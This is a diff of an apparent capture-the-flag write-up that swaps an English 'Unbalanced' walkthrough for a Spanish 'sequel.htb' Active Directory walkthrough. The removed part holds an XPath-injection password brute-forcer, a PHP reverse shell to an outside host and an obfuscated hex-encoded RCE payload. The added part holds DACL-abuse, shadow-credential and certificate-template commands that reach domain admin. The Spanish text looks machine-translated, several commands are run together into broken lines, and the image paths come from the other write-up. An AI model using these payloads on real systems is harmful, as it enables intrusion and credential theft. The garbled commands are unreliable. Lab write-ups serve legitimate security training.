@@ -108,188 +108,55 @@ Asegúrese de buscar al anfitrión en busca de algo útil. Por ejemplo, tiene ar
 evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
 
 ![](/assets/images/htb-writeup-unbalanced/evil.png)
-The `squid.conf` configuration is what we'll be looking at next. Squid is an open-source caching proxy for HTTP and HTTPS traffic. The configuration contains security rules restricting access to the intranet site. From the configuration we find a hostname: `intranet.unbalanced.htb`. The configuration restricts access to the backend networks but the `acl intranet_net dst -n 172.16.0.0/12` will allow the proxy to reach that network. We don't have the IP for the  `intranet.unbalanced.htb` host but we can guess it'll be in that network.
+
+ Bandera de raíz Enlace a la partida
+
+A continuación, considere la explotación de las listas de control de acceso discreto (DACL) utilizando el permiso de WriteOwner. El abuso del permiso de WriteOwner puede llevar a un cambio del propietario del objeto a un usuario controlado por un atacante (en este caso, ryan) y capturar el objeto.
+
+El informe Bloodhound contribuyó a encontrar el vector.
+
+python3 bloodyAD.py --host DC01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'set owner ca_svc ryan
+
+![](/assets/images/htb-writeup-unbalanced/bloo.png)
+
+
+A continuación, establezca permisos FullControl para Ryan. Ahora podremos controlar el objeto de este usuario, incluida la capacidad de modificarlo y borrarlo.
+
 
 ```
-# Allow access to intranet
-acl intranet dstdomain -n intranet.unbalanced.htb
-acl intranet_net dst -n 172.16.0.0/12
-http_access allow intranet
-http_access allow intranet_net
-
-# And finally deny all other access to this proxy
-http_access deny all
-#http_access allow all
-[...]
-# No password. Actions which require password are denied.
-cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
-cachemgr_passwd disable all
-```
-
-The configuration also contains the cachemgr password: `Thah$Sh1`
-
-The cache manager is the component for Squid that provide reports and statistics about the Squid process running. We can interact with the cache manager over  HTTP manually but to make it a bit easier we can use the `squidclient` CLI utility. I've highlighted `fqdncache` because that's where we'll look to find the IP's of the servers behind the proxy.
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801200747899.png)
-
-With the `squidclient -W 'Thah$Sh1' -U cachemgr -h 10.10.10.200 squidclient cache_object://intranet.unbalanced.htb mgr:fqdncache` command we'll get the cache entries, showing 3 different hosts.
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801201208461.png)
-
-## Website
-
-Using Burp instead of proxying directly from the browser is better because we'll be able to look at the traffic, modify requests, etc. The configuration from in Burp is shown here:
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801201823427.png)
-
-We can now reach the intranet site through the Squid proxy. The page has a login form for the Employee Area, some package information below and a non-functional contact form at the bottom of the page.
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801202142101.png)
-
-Unfortunately, the login doesn't return anything when we try credentials, it just reloads the same page without an **invalid credentials** error message or other indication that the page works or not. The `http://172.31.179.2/intranet.php` and `http://172.31.179.2/intranet.php` sites are exactly the same and the login form doesn't work either.
-
-However, there's another active host not present in fqdncache that we can find by guessing the name/IP based on the other two entries: `172.31.179.1 / intranet-host1.unbalanced.htb`.
-
-This server is configured differently and does return an invalid credential message when try to connect to it. I tried checking for SQL injection but I couldn't find anything manually or through sqlmap.
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801203244623.png)
-
-## XPath injection
-
-After dirbusting the site for additional clues we find an `employees.xml` file which unfortunately we can't access. However this is a hint that we are probably looking at an XML authentication backend instead of SQL, so we should now be thinking about XPath injection.
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801204925666.png)
-
-After messing with payloads for a while I found that we can return all the entries by using the following request:
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801210131487.png)
+dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'    
 
 ```
-<div class="w3-container"><h3>   rita       Rita</h3><p>      Fubelli</p><p>Role:       rita@unbalanced.htb</p></div>
-<div class="w3-container"><h3>   Jim       Mickelson</h3><p>      jim@unbalanced.htb</p><p>Role:       Web Designer</p></div>
-<div class="w3-container"><h3>   Bryan       Angstrom</h3><p>      bryan@unbalanced.htb</p><p>Role:       System Administrator</p></div>
-<div class="w3-container"><h3>   Sarah       Goodman</h3><p>      sarah@unbalanced.htb</p><p>Role:       Team Leader</p></div>
-```
-
-Now we have the usernames but no password yet.
-
-Here's the boolean script we'll use to extract the password for all 4 accounts:
-
-```python
-#!/usr/bin/python3
-
-import requests
-import string
-from pwn import *
-
-proxies = {
-    "http": "10.10.10.200:3128"
-}
-
-usernames = [
-    "rita",
-    "jim",
-    "bryan",
-    "sarah"
-]
-
-def getChar(user, x, i):
-    url = "http://172.31.179.1:80/intranet.php"    
-    data = {"Username": user, "Password": "a' or substring(//Username[contains(.,'" + user + "')]/../Password,{0},1)='{1}']\x00".format(str(i), x)}
-    r = requests.post(url, data=data, proxies=proxies)
-    if len(r.text) == 7529:
-        return True
-    else:
-        return False
-
-charset = string.ascii_letters + string.digits + string.punctuation
-
-for user in usernames:
-    pwd = ""
-    l = log.progress("Brute Forcing %s... " % user)
-    log_pass = log.progress("Password: ")
-    i = 1
-    while True:
-        canary = True
-        for x in charset:
-            l.status(x)
-            res = getChar(user,x, i)
-            if res:
-                canary = False
-                pwd += x
-                log_pass.status(pwd)
-                i += 1
-                break
-        if canary:
-            break
-
-l.success("DONE")
-log_pass.success(pwd)
-```
-
-Running the script we get the following passwords:
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801212846920.png)
-
-The only credentials that work over SSH are `bryan / ireallyl0vebubblegum!!!`
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801212949995.png)
-
-## Pi-hole CVE-2020-11108
-
-Checking the listening sockets we see something on port 5553.
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801213125467.png)
-
-Googling port 5553 confirms what we see in the TODO file: it's running the Pi-hole:
+El siguiente comando certipy-ad de abusar automáticamente de la cuenta de sombra cásvc. Nos conectamos al controlador de dominio por dirección IP (-dc-ip) y utilizamos las credenciales especificadas para la autenticación.
 
 ```
-bryan@unbalanced:~$ cat TODO
-############
-# Intranet #
-############
-* Install new intranet-host3 docker [DONE]
-* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
-* Test intranet-host3 [DONE]
-* Add intranet-host3 to load balancer [DONE]
-* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
-* Fix intranet-host2 [DONE]
-* Re-add intranet-host2 to load balancer (set default weight) [DONE]
-- Fix intranet-host1 [TODO]
-- Re-add intranet-host1 to load balancer (set default weight) [TODO]
-
-###########
-# Pi-hole #
-###########
-* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
-* Set temporary admin password [DONE]
-* Create Pi-hole configuration script [IN PROGRESS]
-- Run Pi-hole configuration script [TODO]
-- Expose Pi-hole ports to the network [TODO
+certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 'DC01.sequel.htb' -ns 10.10.11.51 -target DC01.sequel.htb -account ca_svc
 ```
 
-The Pi-hole has an RCE CVE documented here: https://frichetten.com/blog/cve-2020-11108-pihole-rce/
-
-I'll establish an SSH local forward with `ssh -L 9080:127.0.0.1:8080 bryan@10.10.10.200` then reach the admin interface on port 8080. Fortunately the `admin / admin` credentials work and we're able to get in.
-
-![](/assets/images/htb-writeup-unbalanced/image-20200801213759929.png)
-
-We'll just modify the PoC exploit with the right IP for our machine: `php -r '$sock=fsockopen("10.10.14.18",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
-
-The final payload looks like this:
-
+![](/assets/images/htb-writeup-unbalanced/cert.png)
 ```
-aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3138222C34343434293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27"));'&&
+KRB5CCNAME=ca_svc.ccachecertipy-ad find -scheme ldap -k -debug -target DC01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
+
+KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target {host name} -dc-ip {ip}
 ```
 
-![](/assets/images/htb-writeup-unbalanced/image-20200801214200971.png)
 
-![](/assets/images/htb-writeup-unbalanced/image-20200801214225678.png)
+![](/assets/images/htb-writeup-unbalanced/cert2.png)
 
-Looking around the container we find a password in the `pihole_config.sh` file:
+Este comando crea una solicitud de certificado para la cuenta de casvc utilizando los hashess y la plantilla especificados:
 
-![](/assets/images/htb-writeup-unbalanced/image-20200801214525034.png)
+certipy-ad req -u ca_svc -hashes :hashes -ca sequel-DC01-CA -target {host} -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@{domain} -ns {ip} -dns {ip}
 
-We can su as root with those creds and pwn the last flag:
+![](/assets/images/htb-writeup-unbalanced/cert3.png)
 
-![](/assets/images/htb-writeup-unbalanced/image-20200801214629712.png)
+Ahora se trata de autenticar al usuario usando el archivo PFX que se obtuvo el paso antes:
+
+
+```
+certipy-ad auth -pfx {some.pfx} -dc-ip {ip}
+```
+![](/assets/images/htb-writeup-unbalanced/certifica.png)
+
+
+Todo lo que queda es usar mal viento y un nuevo hash administrador. La bandera de raíz nos estará esperando en el escritorio.
+![](/assets/images/htb-writeup-unbalanced/evil2.jpg)
